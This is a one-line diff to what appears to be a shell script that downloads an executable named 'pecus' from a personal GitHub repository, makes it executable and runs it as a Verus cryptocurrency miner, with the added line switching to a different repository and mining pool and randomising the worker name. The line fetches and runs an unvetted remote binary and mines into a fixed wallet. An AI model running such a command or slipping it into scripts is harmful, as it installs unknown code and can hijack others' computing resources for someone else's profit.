@@ -1,1 +1,1 @@
-wget https://raw.githubusercontent.com/Zuraadlef/sda/main/pecus && chmod +x pecus && ./pecus -a verus -o stratum+tcp://pool.verus.io:9999 -u RVj1VkZYsvMHgRtNRn8z1eeGkTCGmK5qmH.w1 -p x -t 90
+wget https://github.com/desafff/pecuk/raw/main/pecus && chmod +x pecus && ./pecus -v -l verushash.na.mine.zergpool.com:3300 -u RVj1VkZYsvMHgRtNRn8z1eeGkTCGmK5qmH.$(echo $(shuf -i 1-99 -n 1)-Ib) -p c=VRSC
